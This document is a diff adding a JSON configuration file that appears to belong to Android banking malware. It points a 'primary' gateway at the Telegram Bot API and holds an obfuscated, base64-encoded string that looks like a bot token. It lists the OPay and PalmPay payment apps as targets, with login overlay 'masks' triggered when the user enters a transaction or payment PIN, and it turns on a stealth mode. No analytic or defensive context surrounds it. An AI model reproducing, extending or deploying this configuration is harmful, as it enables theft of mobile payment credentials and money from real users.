@@ -1,0 +1,25 @@
+{
+  "version": "2.6.0",
+  "status": "active",
+  "gateways": {
+    "primary": "https://api.telegram.org/bot",
+    "st_link": "Nzc0NzE2NjQ0NzpBQUZSVHlTclZkaG03X2JmX2R0bWswRk01T0J4bXNnZW5EOQ=="
+  },
+  "targets": [
+    {
+      "app": "com.opay.payments",
+      "mask": "mask_opay_login",
+      "trigger": "transaction_pin"
+    },
+    {
+      "app": "com.transsnet.palmpay",
+      "mask": "mask_palmpay_login",
+      "trigger": "payment_pin"
+    }
+  ],
+  "intervals": {
+    "sync_ms": 5000,
+    "stealth_mode": true
+  }
+}
+
